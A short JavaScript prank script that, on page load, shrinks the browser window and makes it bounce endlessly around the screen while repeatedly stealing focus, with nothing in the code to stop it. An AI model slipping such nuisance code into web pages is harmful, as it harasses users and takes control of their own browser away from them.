var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;

function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 100);
  }
}

window.onload = function() {
  playBall();
  window.resizeTo(175, 100);
};